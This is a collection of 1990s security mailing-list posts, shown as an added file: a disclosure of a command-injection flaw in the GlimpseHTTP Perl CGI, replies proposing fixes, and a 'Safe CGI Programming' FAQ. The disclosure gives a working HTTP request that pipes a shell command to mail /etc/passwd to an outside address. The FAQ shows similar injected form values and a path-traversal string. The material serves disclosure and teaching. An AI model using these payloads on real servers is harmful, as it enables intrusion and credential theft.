@@ -1,0 +1,471 @@
+
+I'm back with another vulnerability, this time in a small utility: Glimpse
+HTTP which is an interface to the Glimpse search tool. It is written in
+PERL.
+
+First my congratulations to the authors. They've done a really great job
+in securing the program (really, I mean it). The hole I exploited is a
+small one but it can allow you to execute any command on the remote
+system (as the owner of the http server).
+
+Allow me to quote from the source (I'm sure I have the latest version, I
+downloaded it 1 hour ago :) ).
+
+--begin--
+
+$path_info = $ENV{'PATH_INFO'};
+$_ = $path_info;
+
+# /<length>/$indexdir/$path is the format of the PATH_INFO
+
+# might as well start the message now print "Content-type: text/html\n\n";
+print "<HTML>\n"; print "<HEAD>\n";
+
+if ( m|^/([0-9]*)(.*)$| ) {
+        $length = $1;
+        $path = $2;
+        $path =~ s|"||g;  } else {
+        &err_badargs;  }
+
+$indexdir = substr($path,0,$length);
+$relpath = substr($path,$length,length($path));
+
+# print "<br>indexdir=$indexdir<br>relpath=$relpath<br>";
+
+open(CONF,"$indexdir/archive.cfg") || &err_conf;
+
+--end--
+
+As you may see, it  splits PATH_INFO in two fields: $length and
+$path and then takes the first $length characters from $path and puts them
+in $indexdir (my phrasing is more twisted than my mind :) ).
+The last line opens "$indexdir/archive.cfg".
+
+Now for the evil part.
+By setting $indexdir to a string that begins with '|', the system will
+execute whatever it finds after the pipe, giving it as STDIN what you
+write to the CONF handle.
+
+The bad thing is that most HTTP servers won't let you use TABS or SPACES
+in the PATH_INFO (not the case of Netscape servers anyway, but CERN and
+Apache will do it). And I don't know how many "one word" commands can
+anyone find (and make them do evil).
+
+Here's where the famous IFS variable comes handy.
+If $indexdir is set to something like
+"|IFS=5;CMD=5mail5drazvan\@pop3.kappa.ro\</etc/passwd;eval$CMD;echo"
+it will execute the command in CMD using IFS as separator. The one above
+sends me your /etc/passwd (so you'd better change something there :) ).
+The last "echo" is used to ignore the rest of the string. An of course you
+can use any other separator instead of "5".
+
+Now for the exploit.
+
+telnet target.machine.com 80
+
+GET /cgi-bin/aglimpse/80|IFS=5;CMD=5mail5drazvan\@pop3.kappa.ro\</etc/passwd;eval$CMD;echo
+HTTP/1.0
+
+Note that the cgi-bin directory could be located somewhere else (for
+example in /scripts or /cgi or a special directory just for glimpse...).
+Also note that you HAVE to use all those backslahes in the command (perl
+wants them there!).
+
+I would like (again) to have some feedback from those who have Glimpse
+installed on their systems. It should work if the script has not been
+modified.
+
+I think that would be all.
+
+Be good.
+Razvan
+
+
+=============================================================================
+
+As the poster pointed out, the "open(..." line below is the problem.
+If we simply look for shell metacharacters and exit if we find any,
+the security problem is abated.  Here's the code I used to do this.
+Insert this code directly above the open line below.  In fact, the
+code goes exactly where I have it placed in this message.
+
+if($indexdir =~ tr/;<>*|`&$!#()[]{}:'"//) {
+        print "<H1>Evil characters found! Exiting.</H1>";
+        exit(1);
+  }
+
+> open(CONF,"$indexdir/archive.cfg") || &err_conf;
+>
+> --end--
+
+=============================================================================
+
+
+
+> As the poster pointed out, the "open(..." line below is the problem.
+> If we simply look for shell metacharacters and exit if we find any,
+> the security problem is abated.  Here's the code I used to do this.
+> Insert this code directly above the open line below.  In fact, the
+> code goes exactly where I have it placed in this message.
+>
+> if($indexdir =~ tr/;<>*|`&$!#()[]{}:'"//) {
+>         print "<H1>Evil characters found! Exiting.</H1>";
+>         exit(1);
+>   }
+
+ There is at least one very dangerous shell metacharacter missing in this list.
+As said in the tutorial where you found this code fragment, the security
+policy should be "that which is not expressly permitted is forbidden". It's
+much safer to use the "complement" of a set of allowed chars, for example:
+
+        $indexdir =~ tr/a-zA-Z0-9//cd;
+
+or
+
+        if ($indexdir =~ /[^a-zA-Z0-9]/) {
+                print "<H1>Evil characters found! Exiting.</H1>";
+                die "Warning ",$ENV{REMOTE_HOST},": $indexdir\n";
+        }
+
+> > open(CONF,"$indexdir/archive.cfg") || &err_conf;
+> >
+> > --end--
+>
+
+
+===========================================================================
+
+
+Safe CGI Programming                          Last updated: 1995-09-03
+----------------------------------------------------------------------
+
+[Note -- the last update of any thoroughness was indeed 1995-09-03.
+However, it turns out people are still using this, so I feel obliged
+to at least correct the glaring errors.  See the section on identifying
+safe characters with regular expressions for an important update.
+Thanks. -- PSP 1997-07-08]
+
+Recent exposure of security holes in several widely used CGI packages
+indicates that the existing documents on CGI security have not taken
+hold in the public consciousness.  These scripts are being redistributed
+to people that have no programming experience and no way to determine
+whether they are opening up their servers for attack.  This causes
+considerable frustration for all involved.
+
+This document is intended for the beginning or intermediate
+CGI programmer.  It is by no means a comprehensive analysis of
+the security risks -- its purpose is to help people avoid the
+most common errors.  This document and other CGI security resources
+are available at
+
+<URL:http://www.go2net.com/people/paulp/cgi-security/>
+
+Please send comments on this document to Paul Phillips <paulp@go2net.com>
+
+Q: "Why should I care? The server runs as nobody, right? That means
+you can't do anything dangerous, even if you break a CGI script."
+
+A: Wrong.  Some of the actions that can be taken in various 
+circumstances are:
+
+ 1) Mailing the password file to the attacker (unless shadowed)
+ 2) Mailing a map of the filesystem to the attacker
+ 3) Mailing system information from /etc to the attacker
+ 4) Starting a login server on a high port and telneting in
+ 5) Many denial of service attacks: massive filesytem finds,
+ for example, or other resource consuming commands
+ 6) Erasing and/or altering the server's log files
+
+Another problem is that some sites are running their webservers
+as root.  I CANNOT EMPHASIZE ENOUGH HOW BAD THIS IS.  You are shooting
+yourself in the foot.  Whatever problem inspired you to do this, you
+must solve it in some other manner, or you *will* be compromised in
+the future.
+
+There has been some confusion as to what it means to "run your 
+webserver as root." It is fine to *start* the webserver as root.
+This is necessary to bind to port 80 on Unix systems.  However,
+the webserver should then give away its privileges with a call
+to setuid.  The webserver's configuration file should allow you
+to specify what user it should run as; the default is normally
+"nobody", a generic unprivileged account.  Remember that it is
+irrelevant which account owns the binary, and the program should 
+not have the setuid bit set.
+
+There is a good argument that servers should not actually run as
+"nobody", but rather as a specific UID and GID dedicated to the 
+webserver, such as "www".  This prevents other programs that run
+as "nobody" from interfering with server-owned files.
+
+There is a program called "cgiwrap" <URL:http://www.umr.edu/~cgiwrap>
+that runs CGI scripts under the UID of the person that owns them.  While
+cgiwrap successfully overcomes some problems with CGI scripts, it also
+exacerbates the effect of security holes.  If an attacker can execute
+commands under the user UID, rm -rf ~ is only a few characters long,
+and the user will lose everything.
+
+
+Q: "Now I'm scared, maybe my code is buggy.  Can you show me some
+examples of security holes?"
+
+A: Now you're talking.  The entire philosophy can be summed up as
+"Never trust input data." Most security holes are exploited by 
+sending data to the script that the author of the script did not
+anticipate.  Let's look at some examples.
+
+Foo wants people to be able to send him email via the web.  She
+has several different email addresses, so she encodes an element
+specifying which one so she can easily change it later without 
+having to change the script.  (She needs her sysadmin's permission
+to install or change CGI scripts -- what a hassle!)
+
+<INPUT TYPE="hidden" NAME="FooAddress" VALUE="foo@bar.baz.com">
+
+Now she writes a script called "email-foo", and cajoles the sysadmin
+into installing it.  A few weeks later, Foo's sysadmin calls her back: 
+crackers have broken into the machine via Foo's script! Where did 
+Foo go wrong?
+
+Let's see Foo's mistake in three different languages.  Foo has
+placed the data to be emailed in a tempfile and the FooAddress 
+passed by the form into a variable.  
+
+Perl:
+
+    system("/usr/lib/sendmail -t $foo_address < $input_file");
+
+C: 
+
+    sprintf(buffer, "/usr/lib/sendmail -t %s < %s", foo_address, input_file);
+    system(buffer);
+
+C++:
+    
+    system("/usr/lib/sendmail -t " + FooAddress + " < " + InputFile);
+
+In all three cases, system is forking a shell.  Foo is unwisely 
+assuming that people will only call this script from *her* form, so
+the email address will always be one of hers.  But the cracker copied
+the form to his own machine, and edited it so it looked like this:
+
+<INPUT TYPE="hidden" NAME="FooAddress"
+VALUE="foo@bar.baz.com;mail cracker@bad.com </etc/passwd">
+
+Then he submitted it to Foo's machine, and the rest is history,
+along with the machine.
+
+
+Q: "I never use system.  I guess my scripts are all safe then!"
+
+A: System is not the only command that forks a shell.  In Perl, 
+you can invoke a shell by opening to a pipe, using backticks, or 
+calling exec (in some cases.)
+
+ * Opening to a pipe: open(OUT, "|program $args");
+ * Backticks: `program $args`;
+ * Exec: exec("program $args");
+
+You can also get in trouble in Perl with the eval statement or
+regular expression modifier /e (which calls eval.) That's beyond
+the scope of this document, but be careful.
+
+In C/C++, the popen(3) call also starts a shell.
+
+ * popen("program", "w");
+
+
+
+Q: "What's the right way to do it?"
+
+A: Generally there are two answers: use the data only where it can't
+hurt you, or check it to make sure it is safe.  
+
+*1* Avoid the shell.
+
+  open(MAIL, "|/usr/lib/sendmail -t");
+  print MAIL "To: $recipient\n";
+
+Now the untrusted data is no longer being passed to the shell.  However,
+it is being passed unchecked to sendmail.  In some sense you are trading
+the shell problems for those of the program you are running externally,
+so be sure that it cannot be tricked with the untrusted data!  For example
+if you use /usr/ucb/mail rather than /usr/lib/sendmail, ~-escapes can be
+used (on some versions) to execute commands.  Be wary.
+
+You can use the perl system() and exec() calls without invoking a shell
+by supplying more than one argument:
+
+  system('/usr/games/fortune', '-o');
+
+You can also use open() to achieve an effect similar to popen, but
+without invoking the shell, by performing
+
+  open(FH, '|-') || exec("program", $arg1, $arg2);
+
+*2* Avoid insecure data.
+
+  unless($recipient =~ /^[\w@\.\-]+$/) {
+    # Print out some HTML here indicating failure
+    exit(1);
+  }
+
+This time we're making sure the data is safe for passing to the
+shell.  The example regexp above specifies what is safe rather than 
+what is unsafe.
+
+  if($to =~ tr/;<>*|`&$!#()[]{}:'"//) {
+    # Print out some HTML here indicating failure
+    exit(1);
+  }
+
+Or, to escape metacharacters rather than just detecting them, 
+a subroutine like this could be used:
+
+  sub esc_chars {
+  # will change, for example, a!!a to a\!\!a
+     @_ =~ s/([;<>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;
+     return @_;
+  }
+
+[UPDATE! As if to highlight the danger inherent in specifying
+unsafe characters rather than safe, several oversights in the above
+regexp have been pointed out to me.  First, the ^ character (carat)
+acts as a pipe under some shells, and should also be escaped.
+Second, the \n character (newline) is not listed, which could
+delimit shell commands depending on circumstances.  And perhaps
+most worrisome, the shell escape character itself \ (backslash)
+could be present in external input.  If an input stream of
+
+  foo\;bar
+
+were run through the substitution above, it would yield 
+
+  foo\\;bar
+
+once again exposing the ; as a shell metacharacter.  In short,
+pay attention to the paragraph below, it's as true now as it ever
+was.  Note that I *have not* modified the esc_chars routine in
+light of this information, so do not use it as-is.
+
+Update Jul 13 1997: the beat goes on.  The regexp also excludes
+the ? metacharacter (which is almost as dangerous as *) and ASCII
+255, which is treated as a delimiter by some shells.]
+
+These regexps specify what is unsafe.  I believe them to be a complete
+list of potentially dangerous metacharacters, but I have no authoritative
+source to check.  The difference between the latter two regexps and the
+first is the difference between the two security policies "that which is 
+not expressly permitted is forbidden" and "that which is not expressly 
+forbidden is permitted." All security professionals will tell you that the 
+former policy is safer.
+
+For maximum security, use both *1* and *2* where possible.
+
+USE PERL TAINT CHECKS: Perl can be very helpful with these problems.
+Invoke it with perl -T to force taint checks; to learn about taint
+checks, see the perl man page.  (The -T option exists only under Perl5.)
+
+
+Q: Can I trust user supplied data if there is no shell involved?
+
+A: No.  There are other issues as well.  Consider this perl code fragment:
+
+  open(MANPAGE, "/usr/man/man1/$filename.1");
+
+This is intended to allow HTML access to man pages.  However, what if the
+user supplied filename is
+
+  ../../../etc/passwd
+
+Anytime you are dealing with pathnamess, be sure to check for 
+the .. component.
+
+
+Q: "What else?"
+
+A: In C and C++, improperly allocated memory is vulnerable to 
+buffer overruns.  Perl dynamically extends its data structures to 
+prevent this.  Imagine code like this:
+
+int foo() {
+    char buffer[10];
+
+    strcpy(buffer, get_form_var("feh"));
+    /* etc */
+}
+
+When writing this code, the author certainly expected the value of
+the feh variable to be less than 10 characters.  Unfortunately for
+him, he didn't make sure, and it turned out to be much longer.  This
+means that user data is overwriting the program stack, which in some
+circumstances can be used to invoke commands.
+
+This is very difficult to exploit and you probably will not encounter 
+it.  Still, it's worth mentioning; a very similar hole was found in
+NCSA httpd 1.3 earlier in 1995.  It is poor programming practice not to
+check such things anyway.
+
+Along the same lines, under no circumstances should the C gets() 
+function be used.  It's inherently insecure, as there is no way 
+to specify how large the input buffer is.  Use fgets() on the stdin
+stream instead.
+
+Q: "My WWW server doesn't run on a unix platform.  Only unix has all
+these nasty security holes."
+
+A: This may or may not be true.  The author of this document has limited
+experience with servers on other platforms, but he is more than a little
+skeptical that security concerns do not exist.  At the very least, the
+gets() and stack-overflow issues are present on Windows and MacOS as well.
+Specific examples of other CGI dangers on other platforms are welcomed.
+
+
+*Appendix*
+
+Contributions to this document welcomed at <paulp@go2net.com>.
+
+Thanks to those that have contributed to this document:
+
+John Halperin <JXH@SLAC.Stanford.EDU>
+Maurice L. Marvin <maurice@cs.pdx.edu>
+Dave Andersen <angio@aros.net>
+Zygo Blaxell <zblaxell@ezmail.com>
+Joe Sparrow <JSPARROW@UVVM.UVIC.CA>
+Keith Golden <kgolden@cs.washington.edu>
+James W. Abendschan <jwa@jammed.com>
+Jennifer Myers <jmyers@marigold.eecs.nwu.edu>
+Jarle Fredrik Greipsland <jarle@runit.sintef.no>
+David Sacerdote <davids@silence.secnet.com>
+
+
+
+============================================================================
+
+All these fixes scanning the pattern are all wonderful,
+but it would be much easier just to do a file test on
+the requested file name before trying to open it.
+
+open (FH,"$dir/archive.cfg") if test -d "$dir" and test -f "$dir/archive.cfg";
+
+Also note that the only meta-characters you need to scan for
+are the arguments which open() accepts, namely "|" and the variants of ">",
+since you don't care (in fact want) read access to the file.
+Other meta-characters will be assumed to be inside the filename.
+The only time it gets fully parsed by the shell is when you
+use the pipe.
+
+Finally, all calls to open should specify the file opening mode
+by preceding the filename with "<" or something like that.  When
+so preceeded, I don't think the piping attack would work, since
+the result would be open (FH,"<|command") which doesn't
+open a pipe.
+
+Also consider using the command sysopen().
+
+I had never seen this error since I had long since rewritten
+most of GlimpseHTTP for my own purposes and I probably removed that
+part because it looked tacky.  In fact now that I think of it I do
+remember replacing lots of regular expressions in the original
+version with limited sets of permissible characters.
+
+
